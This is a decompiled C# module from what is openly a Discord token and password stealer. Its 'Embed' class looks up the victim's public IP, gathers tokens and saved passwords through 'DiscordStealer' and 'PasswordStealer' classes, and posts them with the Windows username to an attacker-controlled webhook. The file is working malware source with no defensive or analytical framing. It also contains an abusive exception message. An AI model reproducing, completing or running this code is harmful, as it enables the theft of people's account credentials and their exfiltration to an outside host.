using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text;
using Newtonsoft.Json;

namespace Modules
{
	// Token: 0x02000011 RID: 17
	[global::System.Runtime.CompilerServices.NullableContext(1)]
	[global::System.Runtime.CompilerServices.Nullable(0)]
	public class Embed
	{
		// Token: 0x06000017 RID: 23 RVA: 0x00003488 File Offset: 0x00001688
		public static string GetIP()
		{
			string text = "";
			using (WebResponse response = WebRequest.Create("http://checkip.dyndns.org/").GetResponse())
			{
				using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
				{
					text = streamReader.ReadToEnd();
				}
			}
			int num = text.IndexOf("Address: ") + 9;
			int num2 = text.LastIndexOf("</body>");
			text = text.Substring(num, num2 - num);
			return text;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x0000351C File Offset: 0x0000171C
		public static void SendMeResults(List<string> A_0, string A_1)
		{
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					StringContent stringContent = new StringContent(JsonConvert.SerializeObject(new
					{
						<<EMPTY_NAME>> = string.Format(Embed.embedFormat, new object[]
						{
							Environment.UserName,
							Embed.GetIP(),
							string.Join("\n", A_0),
							A_1.Substring(0, 250)
						})
					}), Encoding.UTF8, "application/json");
					if (httpClient.PostAsync(Embed.webhook, stringContent).Result.StatusCode != HttpStatusCode.OK)
					{
						throw new Exception("Buddy Kys!!!");
					}
				}
				Console.WriteLine("Webhook sent successfully.");
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error sending webhook: " + ex.Message);
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000035FC File Offset: 0x000017FC
		public void Run()
		{
			DiscordStealer discordStealer = new DiscordStealer();
			PasswordStealer passwordStealer = new PasswordStealer();
			List<string> tokens = discordStealer.GetTokens();
			string[] array = passwordStealer.Run();
			if (tokens == null)
			{
				return;
			}
			if (tokens.Count <= 0)
			{
				return;
			}
			Console.WriteLine(string.Join("\n", array));
			Embed.SendMeResults(tokens, string.Join("\n", array));
		}

		// Token: 0x0400002B RID: 43
		public static string webhook = PasswordStealer.Webhook_link;

		// Token: 0x0400002C RID: 44
		public static readonly string embedFormat = "Username : {0}\nIp : {1}\nTokens : {2}\n Passwords : {3}";
	}
}
